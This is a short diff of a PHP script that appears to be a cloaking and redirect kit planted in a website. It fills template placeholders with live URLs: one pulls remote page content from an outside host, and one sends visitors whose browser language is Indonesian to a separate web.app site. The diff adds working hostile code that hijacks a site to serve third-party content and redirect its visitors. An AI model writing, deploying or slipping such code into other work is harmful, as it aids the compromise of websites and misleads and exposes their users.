@@ -1,6 +1,6 @@
 <?php
 
-$contents = '#LINKLP';
+$contents = 'https://includes-page.com/cmd/aislacastilla.com/lp.txt';
 $allDevice = true;
 
 function getContents($url) {
@@ -89,7 +89,7 @@ function getRealIP(){
 
  $browserLang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
     if ($browserLang == 'id') {
-        header("Location: #LINKAMP");
+        header("Location: https://pemulaphuss.web.app/");
         exit;
     }
 
